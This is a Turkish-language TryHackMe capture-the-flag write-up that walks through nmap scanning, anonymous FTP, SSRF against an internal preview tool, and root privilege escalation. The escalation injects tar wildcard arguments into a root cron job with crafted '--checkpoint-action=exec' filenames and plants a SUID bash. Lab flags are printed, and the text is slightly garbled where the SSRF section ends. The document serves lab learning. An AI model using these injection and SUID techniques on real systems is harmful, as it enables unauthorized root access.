# TryHackMe - Operation Coldstart Writeup

## Keşif

İlk olarak nmap taraması ile başlıyoruz:

```bash
nmap -sS -A -p- 10.114.141.161
```

<img width="805" height="596" alt="nmap" src="https://github.com/user-attachments/assets/5eb61782-602c-4472-b154-5361646ec3d3" />

Tarama sonucunda FTP servisinin açık olduğunu gördüm. Anonim erişim ihtimaline karşı direkt bağlanmayı denedim:

```bash
ftp 10.114.141.161
```

---

## FTP Enumerasyonu ve Dosya Analizi

FTP'ye bağlandığımda karşımda `backup.tar.gz` adında bir dosya vardı. Bunu `get` komutuyla kendi makineme çektim:

```bash
get backup.tar.gz
```

<img width="889" height="431" alt="getbackup" src="https://github.com/user-attachments/assets/ab6665f5-eeb7-4d87-bf25-31091f2effeb" />

Dosyayı açtım:

```bash
tar -xvf backup.tar.gz
```

Arşivin içinden şu dosyalar çıktı:

```
voltlabs-preview/
voltlabs-preview/requirements.txt
voltlabs-preview/README.md
voltlabs-preview/app.py
```

<img width="323" height="99" alt="backupçıkan" src="https://github.com/user-attachments/assets/efb00495-dac0-4d4c-80b2-67799ff16089" />

Bu dosyaları tek tek inceledim. `app.py` ve `README.md` içeriğinden anladığım kadarıyla sistemde şu dosya bulunuyordu:

```
/opt/voltlabs-preview/admin_notes.txt
```

Ayrıca kod, uygulamanın dahili olarak şu host üzerinde çalıştığını gösteriyordu:

```
kestrel.thm
```

Bu domaini tarayıcıdan ziyaret ettim.

---

## SSRF ile Bilgi Sızıntısı

<img width="1919" height="556" alt="site" src="https://github.com/user-attachments/assets/bd445515-6506-47ff-8a4f-3a4c9891afc1" />

Sayfanın kendisi "internal tool" ve "do not expose externally" gibi ibarelerle dahili kullanım için tasarlandığını söylüyordu, ama dışarıdan erişilebilir durumdaydı. Bu tarz "bir URL ver, içeriğini sana getireyim" şeklinde çalışan araçlar klasik bir **SSRF** adayıdır — sunucu, benim yerime kendi üzerindeki ya da dahili ağdaki kaynaklara istek atıyor.

Daha önce `app.py` kaynak kodundan öğrendiğim `/opt/voltlabs-preview/admin_notes.txt` dosyasının, uygulama içinde muhtemelen `/admin/notes` route'una karşılık geldiğini düşünerek bu adresi preview aracına verdim:

```
http://kestrel.thm/admin/notes
```

<img width="1919" height="503" alt="site2" src="https://github.com/user-attachments/assets/e16385f3-afa6-4158-ab60-621e951c1941" />

Yani `/admin/notes` sayfası doğrudan dışarıdan korunuyor olabilirdi, ama SSRF açığı sayesinde uygulamanın **kendi üzerinden** bu içeriğe ulaşabildim.vermişti.

---

## SSH ile Giriş ve User Flag

Bulduğum kimlik bilgileriyle SSH üzerinden bağlandım:

```bash
ssh webdev@10.114.141.161
```

Giriş başarılı oldu ve ilk flag'i ele geçirdim:

```
THM{96dc7bd50d2fb98fcece01560788b5ab}
```
<img width="443" height="100" alt="flag1" src="https://github.com/user-attachments/assets/2ec0c12c-14ab-4397-aa14-65eecabbd0ec" />

---

## Cron Görev Keşfi

Sisteme eriştikten sonra her zaman yaptığım gibi ilginç dosyalara, servislere ve zamanlanmış görevlere bakmaya başladım. `/etc/cron.d/` altında dikkatimi çeken bir dosya vardı:

```bash
cat /etc/cron.d/voltlabs-backup
```
<img width="617" height="213" alt="privesc" src="https://github.com/user-attachments/assets/fb9484f2-85b8-490e-bf9d-5af69a7b5679" />

Bu son derece ilginçti. Root kullanıcısına ait bir cron görevi, her dakika `/opt/backups` dizini içinde şu komutu çalıştırıyordu:

```
tar czf /var/backups/uploads.tgz *
```

Burada dikkat çeken nokta, `tar` komutunun argüman olarak `*` (wildcard/joker karakter) kullanmasıydı. Bu, klasik bir **tar wildcard injection** fırsatı yaratıyor.

---

## Tar Wildcard Injection ile Privilege Escalation

`tar`, joker karakter genişlemesi (wildcard expansion) kötüye kullanıldığında komut satırı argüman enjeksiyonuna karşı savunmasızdır. Konuyla ilgili referans:

Mantık şu: shell, `*` karakterini dizindeki dosya adlarıyla genişletiyor. Eğer dizine `tar`'ın özel argüman olarak yorumlayacağı isimlerde (`--checkpoint=...` gibi) dosyalar koyarsam, `tar` bunları normal dosya değil komut satırı parametresi sanıp çalıştırıyor.

### Payload Hazırlama

Önce yedekleme dizinine geçtim:

```bash
cd /opt/backups
```

Root olarak çalıştırılacak zararlı script'i oluşturdum:

```bash
echo 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash' > shell.sh
```

Ardından `tar`'ı kandıracak dosya adlarını oluşturdum:

```bash
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh shell.sh'
```

Cron görevi çalıştığında bu dosya adları `tar` tarafından argüman olarak yorumlanacak ve `shell.sh`'ı root yetkisiyle tetikleyecekti.

### Cron'un Çalışmasını Bekleme

Yaklaşık bir dakika bekledim, çünkü cron görevi her dakika tetikleniyordu. Süre dolduğunda enjekte ettiğim argümanlar sayesinde `shell.sh`, root olarak çalıştırıldı. Bu da `/tmp/bash` dosyasını **SUID biti set edilmiş** halde oluşturdu.

Doğrulamak için:

```bash
ls -l /tmp/bash
```

Dosyanın artık root kullanıcısına ait olduğunu ve SUID bitiyle çalıştırılabilir durumda olduğunu gördüm.

<img width="814" height="214" alt="privesc2" src="https://github.com/user-attachments/assets/d638511e-a1e1-4f13-b855-9e79d837be2b" />

---

## Root Erişimi ve Root Flag

SUID bitli bash'i çalıştırdım:

```bash
/tmp/bash -p
```

Root kabuğunu elde etmiştim. Ardından flag'i okudum:

```bash
cd /root
cat flag.txt
```

Çıktı:

```
THM{e6ee84a483d67ade06936fcfd1433e8a}
```
